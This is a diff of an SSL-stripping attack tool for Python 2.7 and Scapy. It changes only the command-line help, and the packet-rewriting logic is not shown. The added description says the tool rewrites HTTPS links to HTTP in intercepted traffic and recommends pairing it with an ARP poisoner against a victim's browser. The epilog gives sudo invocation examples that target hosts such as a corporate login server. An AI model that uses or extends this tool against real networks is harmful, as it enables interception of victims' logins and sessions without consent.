@@ -140,15 +140,46 @@ def proc(pkt, iface, host_filter):
 
 
 def main():
-    ap = argparse.ArgumentParser(description="SSL-stripper (Py-2.7, Scapy)")
-    ap.add_argument("-i", "--iface", help="interface to sniff/inject")
-    ap.add_argument("--bpf", default="tcp port 80",
-                    help="extra BPF (ANDed) [default: tcp port 80]")
-    ap.add_argument("--hosts",
-                    help="comma-separated hostnames/wildcards to target")
+    epilog_txt = """\
+    Examples
+    --------
+    # 1) Strip every HTTPS upgrade that crosses port 80 on iface *enp0s10*
+    sudo python2 sslstrip27.py -i enp0s10 -v
+
+    # 2) Only tamper with two specific hosts
+    sudo python2 sslstrip27.py -i enp0s10 --hosts login.corp.local,*.evil.org
+
+    # 3) An internal app runs HTTP on 8080 – strip that instead
+    sudo python2 sslstrip27.py -i enp0s10 --bpf "tcp port 8080"
+    """
+
+    ap = argparse.ArgumentParser(
+        prog="sslstrip27.py",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description="""\
+    SSL-stripper for Python 2.7 + Scapy 2.4.x
+
+    The tool sits in the forwarding path, watches **unencrypted** HTTP
+    traffic and rewrites every reference to “https://” into “http://”.
+    Typical use: combine with an ARP-poisoner so the victim’s browser
+    contacts port 80 first, then downgrade the redirect and in-page links.""",
+        epilog=epilog_txt)
+
+    ap.add_argument("-i", "--iface", metavar="IFACE",
+                    help="network interface to sniff & inject (default: Scapy’s conf.iface)")
+    ap.add_argument("--bpf", default="tcp port 80", metavar="FILTER",
+                    help="extra **tcpdump-style** BPF expression AND-ed with "
+                         "'tcp port 80' (ex: --bpf \"tcp and net 10.0.0.0/24\")")
+    ap.add_argument("--hosts", metavar="LIST",
+                    help="comma-separated hostnames or *.wildcards "
+                         "— only those responses are rewritten")
+
     vq = ap.add_mutually_exclusive_group()
-    vq.add_argument("-v", "--verbose", action="store_true")
-    vq.add_argument("-q", "--quiet",   action="store_true")
+    vq.add_argument("-v", "--verbose", action="store_true",
+                    help="chatty debug output")
+    vq.add_argument("-q", "--quiet",   action="store_true",
+                    help="only log warnings & errors")
+
     args = ap.parse_args()
 
     iface = args.iface or conf.iface
